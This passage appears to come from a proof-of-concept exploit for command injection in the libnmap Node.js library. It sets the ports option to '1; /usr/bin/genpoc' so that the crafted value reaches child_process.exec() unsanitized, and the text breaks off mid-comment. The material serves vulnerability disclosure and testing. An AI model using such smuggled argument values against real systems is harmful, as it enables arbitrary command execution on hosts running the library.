   // terminate the intended nmap arguments and append a malicious command.

   const opts = {
      range: '127.0.0.1/32',
      ports: '1; /usr/bin/genpoc',
      flags: ['-n'],
      timeout: 1,
      verbose: true
   };

   // Creating an NmapJob instance with the crafted options prepares the vulnerable command string.
   const nmap = new libnmap.NmapJob(opts);

   // Starting the scan triggers the code path in lib/classes/tools.js#funcs
   // which calls child_process.exec() with the unsanitized command, 
